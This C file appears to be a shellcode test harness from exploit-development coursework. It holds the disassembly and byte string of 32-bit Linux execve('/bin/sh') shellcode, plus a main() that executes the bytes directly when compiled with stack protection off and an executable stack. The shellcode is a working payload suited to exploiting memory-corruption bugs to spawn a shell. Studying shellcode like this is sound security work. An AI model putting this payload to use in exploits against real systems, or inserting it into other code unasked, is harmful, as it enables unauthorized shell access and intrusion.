/*

// Author: Cameron, James
// Compile With: gcc test.c -fno-stack-protector -z execstack
// Tested On: Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
//            Ubuntu 12.04.4 LTS

slae@ubuntu:~/Documents/github/shellcode/execve-sh_Stack$ objdump -M intel -d execve-sh_Stack

execve-sh_Stack:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       31 c0                   xor    eax,eax
 8048062:       68 43 43 43 43          push   0x43434343
 8048067:       89 04 24                mov    DWORD PTR [esp],eax
 804806a:       89 e2                   mov    edx,esp
 804806c:       68 42 42 42 42          push   0x42424242
 8048071:       89 e1                   mov    ecx,esp
 8048073:       68 2f 73 68 41          push   0x4168732f
 8048078:       88 44 24 03             mov    BYTE PTR [esp+0x3],al
 804807c:       68 2f 62 69 6e          push   0x6e69622f
 8048081:       89 e3                   mov    ebx,esp
 8048083:       89 64 24 08             mov    DWORD PTR [esp+0x8],esp
 8048087:       b0 0b                   mov    al,0xb
 8048089:       cd 80                   int    0x80

*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\x31\xc0\x68\x43\x43\x43\x43\x89\x04\x24\x89\xe2\x68\x42\x42\x42\x42\x89\xe1\x68\x2f\x73\x68\x41\x88\x44\x24\x03\x68\x2f\x62\x69\x6e\x89\xe3\x89\x64\x24\x08\xb0\x0b\xcd\x80";


int main(){

	printf("[*]Executing shellcode of length: %d\n", strlen(shellcode));
	int (*run)() = (int(*)())shellcode;
	run();
	return 0;

}
